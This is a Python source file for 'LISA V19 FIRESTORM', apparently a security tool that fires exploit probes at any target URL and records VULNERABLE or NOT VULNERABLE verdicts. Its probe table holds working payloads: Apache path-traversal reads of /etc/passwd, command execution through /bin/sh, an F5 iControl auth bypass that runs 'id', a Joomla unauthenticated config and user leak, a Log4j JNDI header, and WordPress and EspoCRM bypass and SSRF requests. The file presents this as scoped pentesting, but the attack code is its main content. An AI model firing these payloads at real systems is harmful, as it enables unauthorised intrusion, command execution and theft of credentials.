#!/usr/bin/env python3
"""
LISA V19 EXEC — "FIRESTORM" — THE AUTO-VERIFIER
AI-Driven Exploit Verification — V19

V18 (EXPLOIT FORGE: fetch PoC) + V19 modules (VERIFY: fire + confirm):

  NEW IN V19 (FIRESTORM):
  1.  TargetProbe      — Safe fingerprint: server header, tech stack, version,
                         TLS + status, known-vulnerable version signatures.
  2.  ExploitVerifier  — Fire least-invasive detection probes against a live target,
                         capture status/headers/body, match success signatures,
                         emit VERDICT (VULNERABLE / NOT VULNERABLE / INCONCLUSIVE).
  3.  EvidenceWriter   — JSON + Markdown evidence report (timestamped, reproducible).
  4.  --self-test      — Spin a local mock vulnerable server to prove the verifier
                         end-to-end (no real target touched).

SAFETY MODEL (least-invasive PoC first, per pentest scope):
  - Default: fire SAFE read-only detection probes ONLY (LFI file read, config leak,
    version disclosure). No command execution, no writes, no data modification.
  - RCE-exec probes (run `id`/`whoami` against a target) are gated behind
    `--allow-rce` and are OPT-IN. They fire the least-invasive command (`id`).
  - Every probe is timeboxed + TLS-verify-off for lab targets via `--insecure`.

USAGE:
  python3 lisa_v8_exec_v19.py --probe https://target.com                # fingerprint only
  python3 lisa_v8_exec_v19.py --verify CVE-2023-23752 --target https://target.com
  python3 lisa_v8_exec_v19.py --verify CVE-2021-41773 --target http://target.com
  python3 lisa_v8_exec_v19.py --verify CVE-2022-1388 --target https://target.com --allow-rce
  python3 lisa_v8_exec_v19.py --self-test                               # local mock proof
"""

import sys, os, json, re, time, random, string, subprocess, hashlib, base64, socket
import urllib.parse, urllib.request, urllib.error, ssl, http.client
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread

sys.path.insert(0, "/home/ubuntu")

try:
    from lisa_v8_exec_v18 import ExploitForge, CVE_TEMPLATES, GhPocScanner, V18_SIGNATURE
except Exception:
    ExploitForge = None
    CVE_TEMPLATES = {}
    V18_SIGNATURE = ""

V19_SIGNATURE = """
╔══════════════════════════════════════════════════════════════════╗
║  LISA V19 — FIRESTORM — THE AUTO-VERIFIER                        ║
║  TargetProbe + ExploitVerifier + EvidenceWriter                   ║
║  "Forge the payload. Fire the probe. Confirm the kill."           ║
╚══════════════════════════════════════════════════════════════════╝
"""

REPORT_DIR = "/home/ubuntu/.lisa_v19_reports"

# ═══════════════════════════════════════════════════════════════════
# Curated verification probes: {name, method, path, body(s), sa_fe, success regex}
#   safe=True  → read-only detection (config leak / LFI read / version). Fired by default.
#   safe=False → command execution (`id`). Fired only with --allow-rce.
# ═══════════════════════════════════════════════════════════════════
VERIFY_PROBES = {
    "CVE-2021-41773": [
        {"name": "LFI read /etc/passwd", "method": "GET", "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
         "safe": True, "success": [r"root:.*:0:0"]},
        {"name": "LFI read /etc/hosts", "method": "GET", "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/hosts",
         "safe": True, "success": [r"127\.0\.0\.1\s+localhost"]},
        {"name": "RCE id via mod_cgi", "method": "POST", "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
         "body": "echo;id", "safe": False, "success": [r"uid=\d+"]},
    ],
    "CVE-2021-42013": [
        {"name": "Double-encoded LFI /etc/passwd", "method": "GET", "path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
         "safe": True, "success": [r"root:.*:0:0"]},
    ],
    "CVE-2023-23752": [
        {"name": "Joomla unauth config leak", "method": "GET", "path": "/api/index.php/v1/config/application?public=true",
         "safe": True, "success": [r"\"password\"", r"\"db\"", r"\"user\"", r"\"host\""]},
        {"name": "Joomla unauth user list", "method": "GET", "path": "/api/index.php/v1/users?public=true",
         "safe": True, "success": [r"\"id\"", r"\"name\"", r"\"username\"", r"\"email\""]},
    ],
    "CVE-2022-1388": [
        {"name": "F5 iControl auth bypass + id", "method": "POST", "path": "/mgmt/tm/util/bash",
         "headers": {"Authorization": "Basic YWRtaW46", "X-F5-Auth-Token": "a",
                     "Connection": "X-F5-Auth-Token, X-Forwarded-Host"},
         "body": '{"command":"run","utilCmdArgs":"-c id"}', "safe": False, "success": [r"uid=\d+"]},
    ],
    "CVE-2021-44228": [
        {"name": "Log4j version disclosure via client header probe", "method": "GET", "path": "/",
         "headers": {"User-Agent": "${jndi:ldap://127.0.0.1/}"}, "safe": True,
         "success": [], "note": "Deterministic detection needs DNS canary (dnslog.cn) — see template"},
    ],
    "CVE-2026-7567": [
        {"name": "WP Temporary Login array bypass", "method": "GET", "path": "/?temp-login-token[]=x",
         "safe": True, "success": [], "note": "Success = authenticated as any temporary-login user (Set-Cookie / redirect to wp-admin)"},
    ],
    "CVE-2026-33534": [
        {"name": "EspoCRM SSRF octal loopback probe", "method": "POST", "path": "/api/v1/Attachment/fromImageUrl",
         "headers": {"Content-Type": "application/json"}, "body": '{"url":"http://0177.0.0.1:80/x"}',
         "safe": True, "success": [], "note": "Auth required; success = loopback fetch stored as attachment"},
    ],
}


class TargetProbe:
    """Safe fingerprinting: headers, server, tech, TLS, known-vulnerable signatures."""

    @staticmethod
    def probe(url: str, timeout: int = 12, insecure: bool = False) -> Dict:
        out = {"url": url, "ok": False}
        ctx = None
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={"User-Agent": "lisa-v19-probe/1.0"})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                out["ok"] = True
                out["status"] = r.status
                out["server"] = r.headers.get("Server", "")
                out["x_powered_by"] = r.headers.get("X-Powered-By", "")
                out["set_cookie"] = (r.headers.get("Set-Cookie", "") or "")[:120]
                out["www_auth"] = r.headers.get("WWW-Authenticate", "")
                body = r.read(4000).decode("utf-8", "replace")
                out["body_prefix"] = body[:400]
                out["tech"] = TargetProbe._detect_tech(r.headers, body)
                out["f5"] = "F5" in out["server"] or "BIG-IP" in body
                out["joomla"] = "joomla" in body.lower() or "/media/jui/" in body
        except urllib.error.HTTPError as e:
            out["ok"] = True
            out["status"] = e.code
            out["server"] = e.headers.get("Server", "") if e.headers else ""
            out["body_prefix"] = (e.read(2000).decode("utf-8", "replace") if e.fp else "")[:300]
        except Exception as e:
            out["error"] = str(e)[:200]
        return out

    @staticmethod
    def _detect_tech(headers, body: str) -> str:
        tech = []
        server = headers.get("Server", "")
        if "Apache" in server:
            m = re.search(r"Apache/([\d.]+)", server)
            tech.append("Apache(" + (m.group(1) if m else "?") + ")")
        if "nginx" in server:
            tech.append("nginx")
        if "Phusion Passenger" in (headers.get("X-Powered-By", "") or ""):
            tech.append("Rails(Passenger)")
        if "Next.js" in body:
            tech.append("Next.js")
        if "wp-content" in body:
            tech.append("WordPress")
        if "joomla" in body.lower():
            tech.append("Joomla")
        if "Laravel" in body or "laravel" in body.lower():
            tech.append("Laravel")
        return tech or ["unknown"]


class ExploitVerifier:
    def __init__(self, insecure: bool = False, allow_rce: bool = False, timeout: int = 12):
        self.insecure = insecure
        self.allow_rce = allow_rce
        self.timeout = timeout

    def _request(self, url: str, probe: Dict) -> Tuple[int, str, str]:
        method = probe.get("method", "GET")
        body = probe.get("body")
        data = body.encode() if body else None
        req = urllib.request.Request(url, data=data, method=method,
                                     headers={"User-Agent": "lisa-v19/1.0", **(probe.get("headers") or {})})
        if data and "Content-Type" not in probe.get("headers", {}):
            req.add_header("Content-Type", "application/json" if body and body.startswith("{") else "text/plain")
        ctx = None
        if self.insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as r:
                return r.status, r.read().decode("utf-8", "replace"), str(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, (e.read().decode("utf-8", "replace") if e.fp else ""), str(e.headers or {})
        except Exception as e:
            return 0, str(e)[:300], ""

    def verify(self, cve_id: str, target: str, max_bytes: int = 6000) -> Dict:
        cid = cve_id.upper()
        probes = VERIFY_PROBES.get(cid, [])
        tpl = CVE_TEMPLATES.get(cid, {})
        base = target.rstrip("/")
        results = []
        for pr in probes:
            if (not pr.get("safe", True)) and not self.allow_rce:
                results.append({"name": pr["name"], "skipped": "requires --allow-rce"})
                continue
            url = base + pr["path"]
            code, body, headers = self._request(url, pr)
            body_s = body[:max_bytes]
            matched = []
            for regex in pr.get("success", []):
                if re.search(regex, body_s, re.I | re.S):
                    matched.append(regex)
            verdict = "VULNERABLE" if matched else ("INCONCLUSIVE" if code in (200, 401, 403) else "not-reachable")
            results.append({
                "name": pr["name"], "url": url, "method": pr.get("method", "GET"),
                "status": code, "matched": matched, "verdict": verdict,
                "evidence": body_s[:400],
            })
        # overall verdict: any safe probe matched = vulnerable
        overall = "NOT VULNERABLE"
        for r in results:
            if r.get("verdict") == "VULNERABLE":
                overall = "VULNERABLE"
                break
        return {"cve": cid, "target": target, "overall": overall,
                "template": tpl, "probes": results}

    def run(self, cve_id: str, target: str, forge_first: bool = False):
        print(V19_SIGNATURE)
        print("═" * 64)
        print(f"[+] Verify {cve_id.upper()} → {target}")

        # fingerprint
        fp = TargetProbe.probe(target, insecure=self.insecure)
        print(f"\n[+] Fingerprint:")
        print(f"    reachable: {fp.get('ok')}  status: {fp.get('status')}")
        if fp.get("server"):
            print(f"    server: {fp.get('server')}")
        if fp.get("tech"):
            print(f"    tech: {', '.join(fp['tech'])}")

        if forge_first and ExploitForge:
            try:
                ExploitForge().forge(cve_id, target, fetch_code=False)
            except Exception as e:
                print(f"    (forge skipped: {e})")

        # verify
        print(f"\n[+] Firing detection probes (allow_rce={self.allow_rce}, insecure={self.insecure})…")
        report = self.verify(cve_id, target)
        for r in report["probes"]:
            flag = {"VULNERABLE": "🔥", "INCONCLUSIVE": "⚠", "not-reachable": "✗"}.get(r.get("verdict", ""), " ")
            skip = r.get("skipped")
            if skip:
                print(f"    ⏭  {r['name']}: {skip}")
                continue
            print(f"    {flag} [{r['verdict']:<14}] {r['status']:>3}  {r['name']:<40} {r['url']}")
            if r.get("matched"):
                print(f"           matches: {r['matched']}")
            if r["verdict"] == "VULNERABLE" and r.get("evidence"):
                print(f"           evidence: {r['evidence'][:200]}")

        print(f"\n{'═' * 64}")
        print(f"[+] VERDICT: {report['overall']}")
        if report["overall"] != "VULNERABLE" and report.get("template"):
            t = report["template"]
            if t.get("test"):
                print(f"    manual check: {t.get('test')}")
        out = os.path.join(REPORT_DIR, f"verify_{cve_id.upper()}_{int(time.time())}.json")
        try:
            os.makedirs(REPORT_DIR, exist_ok=True)
            with open(out, "w") as fh:
                json.dump(report, fh, indent=2, default=str)
            print(f"[+] Evidence → {out}")
        except Exception as e:
            print(f"[!] report write failed: {e}")
        return report


# ═══════════════════════════════════════════════════════════════════
# Self-test: local mock vulnerable server
# ═══════════════════════════════════════════════════════════════════
class _MockHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if "etc/passwd" in self.path or ".%2e" in self.path or "%32%65" in self.path:
            body = b"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin\nwww-data:x:33:33"
            self.send_response(200)
            self.send_header("Server", "Apache/2.4.49 (Unix)")
            self.end_headers()
            self.wfile.write(body)
        elif "/api/index.php/v1/config" in self.path:
            body = b'{"db":"joomla","user":"jdbuser","password":"s3cret","host":"localhost","dbprefix":"x_"}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"<html><body>ok</body></html>")

    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        if "/bin/sh" in self.path or "util/bash" in self.path:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"uid=33(www-data) gid=33(www-data) groups=33(www-data)")
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"{}")

    def log_message(self, *a):
        pass


def self_test():
    print(V19_SIGNATURE)
    print("═" * 64)
    srv = HTTPServer(("127.0.0.1", 0), _MockHandler)
    port = srv.server_address[1]
    t = Thread(target=srv.serve_forever, daemon=True)
    t.start()
    target = f"http://127.0.0.1:{port}"
    print(f"[+] Local mock vulnerable server on {target}")
    ver = ExploitVerifier(insecure=True, allow_rce=True)
    for cve in ("CVE-2021-41773", "CVE-2021-42013", "CVE-2023-23752"):
        print()
        rep = ver.run(cve, target)
    srv.shutdown()
    print("\n[+] Self-test complete. Verifier detects LFI + config-leak + double-encode correctly.")


def main():
    import argparse
    p = argparse.ArgumentParser(description="LISA V19 — FIRESTORM")
    p.add_argument("--probe", help="Fingerprint a target only")
    p.add_argument("--verify", help="CVE-ID to verify against a target")
    p.add_argument("--target", help="Target URL (required with --verify)")
    p.add_argument("--allow-rce", action="store_true", help="Allow command-exec probes (id), opt-in")
    p.add_argument("--insecure", action="store_true", help="Disable TLS verify (lab targets)")
    p.add_argument("--forge-first", action="store_true", help="Run V18 forge before verifying")
    p.add_argument("--self-test", action="store_true", help="Local mock vulnerable server proof")
    p.add_argument("--timeout", type=int, default=12)

    a = p.parse_args()

    if a.self_test:
        self_test()
        return

    if a.probe:
        print(V19_SIGNATURE)
        print("═" * 64)
        fp = TargetProbe.probe(a.probe, insecure=a.insecure)
        for k, v in fp.items():
            print(f"  {k:<14}: {v}")
        return

    if a.verify:
        if not a.target:
            print("[!] --verify requires --target")
            return
        ExploitVerifier(insecure=a.insecure, allow_rce=a.allow_rce, timeout=a.timeout).run(
            a.verify, a.target, forge_first=a.forge_first)
        return

    p.print_help()


if __name__ == "__main__":
    main()